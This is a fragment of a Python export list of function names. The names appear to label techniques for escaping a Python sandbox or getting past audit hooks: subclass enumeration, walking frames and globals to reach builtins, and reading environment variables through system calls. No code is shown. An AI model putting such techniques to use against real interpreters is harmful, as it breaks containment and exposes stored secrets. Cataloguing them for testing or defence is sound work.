    "AuditPolicy",
    "parse_audit_hooks",
    "split_literal",
    "literal_expr",
    "subclasses_enum",
    "select_class",
    "module_globals",
    "read_env_and_write",
    "read_env_via_system",
    "builtins_from_globals",
    "frame_walk_locals",
    "rank",
    "render",
]
